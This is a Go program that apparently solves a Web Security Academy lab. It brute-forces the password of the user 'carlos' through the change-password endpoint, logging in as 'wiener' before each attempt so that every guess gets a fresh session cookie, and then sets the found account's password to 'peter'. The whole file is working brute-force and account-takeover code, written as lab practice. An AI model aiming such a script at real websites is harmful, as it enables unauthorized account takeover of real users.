package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)

func solve(hostname string) {
	/*
		What is known?
		- Each login gives the right to try the password change only once
		- The session cookie given in the login phase is what gives the password change possibility
		- More than one session cookie can be active at any given time


		Steps to solve:
		- Read candidate passwords into array
		- For each candidate password:
			- Create a session cookie (login with wiener account)
			- Use created cookie to change `carlos` password (POST /change-password)
			- Success occurs when 200 is returned!
	*/

	candidatePasswords, err := readFromFile("assets/candidate-passwords.txt")
	if err != nil {
		log.Printf("Error reading the file %s", err)
		return
	}

	log.Printf("Found %d candidates passwords", len(candidatePasswords))

	targetUser := "carlos"
	bruteForce(hostname, targetUser, candidatePasswords)
}

func bruteForce(hostname string, targetUser string, candidatePasswords []string) {
	found := make(chan bool)
	maxRoutines := 2 // Limits the number of routines to not overflow the number of sockets that can be open

	routinesCalled := 0
	for _, password := range candidatePasswords {
		go passwordAttempt(hostname, targetUser, password, found)
		routinesCalled++

		if routinesCalled == maxRoutines {
			foundPassword := false
			for routinesCalled > 0 && !foundPassword {
				foundPassword = <-found
				routinesCalled--
			}
			if foundPassword {
				break
			}
		}
	}
}

func passwordAttempt(
	hostname string,
	targetUser string,
	candidatePassword string,
	found chan bool,
) {
	loginCookies := loginWithWiener(hostname)
	log.Printf("Login cookies: %s", loginCookies)
	hasSuccess, err := attemptToChangePassword(
		hostname,
		loginCookies,
		targetUser,
		candidatePassword,
		"peter",
	)
	if err != nil {
		log.Printf("Error while trying to access my account: %s", err)
	}

	if hasSuccess {
		log.Printf("Found password! It is: %s", candidatePassword)
	}

	found <- hasSuccess
}

func readFromFile(filePath string) ([]string, error) {
	fileBytes, err := ioutil.ReadFile(filePath)

	if err != nil {
		return []string{}, err
	}

	return strings.Split(string(fileBytes), "\n"), nil
}

func loginWithWiener(hostname string) []*http.Cookie {
	uri := fmt.Sprintf("%s/login", hostname)
	data := url.Values{"username": {"wiener"}, "password": {"peter"}}

	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Something not right when making the login request... Err: %s", err)
		return []*http.Cookie{}
	}

	client := makeClientWithoutRedirect()

	resp, _ := client.Do(req)
	for resp.StatusCode != http.StatusFound {
		resp, _ = client.Do(req)
	}

	return resp.Cookies()
}

func attemptToChangePassword(
	hostname string,
	cookies []*http.Cookie,
	targetUser string,
	candidatePassword string,
	finalPassword string,
) (bool, error) {
	uri := fmt.Sprintf("%s/my-account/change-password", hostname)
	data := url.Values{
		"username":         {targetUser},
		"current-password": {candidatePassword},
		"new-password-1":   {finalPassword},
		"new-password-2":   {finalPassword},
	}

	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))

	if err != nil {
		return false, err
	}

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	client := makeClientWithoutRedirect()
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	log.Printf("Attempt with %s went with %d", candidatePassword, resp.StatusCode)
	return resp.StatusCode == http.StatusOK, nil
}

func makeClientWithoutRedirect() *http.Client {
	return &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	hardcodedHostname := "https://ac821f251ed861f2c0c95106002b00da.web-security-academy.net"
	solve(hardcodedHostname)
}
